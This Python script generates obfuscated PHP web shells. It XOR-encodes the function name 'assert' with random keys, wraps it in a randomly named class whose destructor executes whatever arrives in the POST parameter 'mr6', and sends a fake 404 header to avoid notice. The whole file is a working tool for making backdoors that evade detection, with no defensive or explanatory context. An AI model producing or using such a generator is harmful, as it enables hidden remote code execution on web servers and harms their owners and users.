import random

func = 'assert'
shell = '''<?php 
header('HTTP/1.1 404');
class  {0}{2}
${1}=new {0}();
@${1}->c=$_POST['mr6'];
?>'''

def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

    
def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
    
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"\x")

def build_func():
    func_line = ''
    key = random_keys(len(func))
    call = '$db='
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line += "$_%d='%s'^\"%s\";" % (i,key[i],enc)
        func_line += '\n'
        call += '$_%d.' % i
    func_line = func_line.rstrip('\n')
    call = call.rstrip('.') + ';'
    func_tmpl = '''{ 
public $c='';
function __destruct(){
%s
%s
return @$db ($this->c);}}''' % (func_line,call)
    return func_tmpl

    
def build_webshell():
    className = random_name(4)
    objName = className.lower()
    func = build_func()
    shellc = shell.format(className,objName,func)
    return shellc
    
if __name__ == '__main__':
    print (build_webshell())
